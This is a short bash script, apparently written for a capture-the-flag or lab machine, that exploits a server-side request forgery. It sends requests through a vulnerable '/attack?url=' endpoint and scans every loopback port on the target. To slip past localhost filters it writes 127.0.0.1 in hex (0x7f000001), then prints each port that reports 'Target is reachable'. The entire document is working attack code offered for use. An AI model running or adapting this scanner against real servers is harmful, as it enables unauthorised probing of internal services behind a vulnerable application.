#! /bin/bash


read -p "Box IP address.. " ip
port=0
while [ $port -lt 65536 ]
do 
  let "port+=1"
  req=$(curl --silent http://$ip:8000/attack?url=http://0x7f000001:$port | grep -E "Target is reachable|The URL schema is not valid.")
      if [[ "$req" == *"Target is reachable"* ]]; then
         echo $port  
      fi
done
